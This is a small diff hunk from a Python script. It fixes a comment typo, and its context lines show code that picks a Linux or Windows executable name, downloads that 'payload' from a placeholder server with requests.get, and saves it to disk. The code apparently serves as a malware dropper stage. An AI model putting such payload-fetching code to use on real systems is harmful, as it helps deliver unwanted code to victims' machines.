@@ -10,7 +10,7 @@ if platform_os == "Linux":
 elif platform_os == "Windows":
     filename = "Windows Exe Name.exe"
 
-# Donwload:
+# Download:
 data = requests.get("http://your-server.com/payload_path/{0}".format(filename))
 # Save
 with open(filename, "wb") as fl:
